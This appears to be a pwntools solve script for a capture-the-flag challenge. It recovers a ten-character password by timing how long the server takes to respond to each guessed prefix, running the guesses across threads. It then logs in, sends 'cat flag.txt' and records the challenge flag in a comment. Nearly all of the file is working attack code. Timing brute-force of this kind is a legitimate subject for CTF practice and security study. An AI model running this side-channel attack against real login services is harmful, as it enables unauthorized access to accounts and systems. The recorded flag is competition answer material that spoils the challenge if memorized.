#!/usr/bin/env python3

import time
import string
from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=True)
libc = exe.libc
# context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]

gdbscript = '''
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or 'vsc.tf'
    port = int(args.PORT or 7004)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)


def worker(prefix):
    context.log_level = 'error'
    io = get_conn(pre_argv, post_argv, gdbscript)
    rl = lambda *a, **k: io.recvline(*a, **k)
    sla = lambda *a, **k: io.sendlineafter(*a, **k)
    
    with io:
        pwd = prefix + (10-len(prefix)) * 'A'
        t = time.time()
        sla(b'Enter the password:\n', pwd.encode())
        out = rl().decode()
        e = time.time()
        if 'Welcome' in out:
            t=0
        return prefix, e-t


from multiprocessing.pool import ThreadPool
if __name__ == "__main__":
    # pwd = "wSotq}JQUe"
    pwd = ""
    while len(pwd) != 10:
        max_time = -1
        with ThreadPool(16) as pool:
            for new_pwd, t in pool.imap(worker, list(map(lambda c: pwd+c, string.printable))):
                print(new_pwd, t)
                if t > max_time:
                    max_time = t
                    pwd = new_pwd
            
            info(pwd)

    io = get_conn(pre_argv, post_argv, gdbscript)
    rl = lambda *a, **k: io.recvline(*a, **k)
    sla = lambda *a, **k: io.sendlineafter(*a, **k)
    sl = lambda *a, **k: io.sendline(*a, **k)
    sla(b'Enter the password:\n', pwd.encode())
    sl(b'cat flag.txt')
    io.stream()


# cat flag.txt
# vsctf{h0w_much_t1m3_d1d_1t_t4k3_to_r3m3mb3r?}
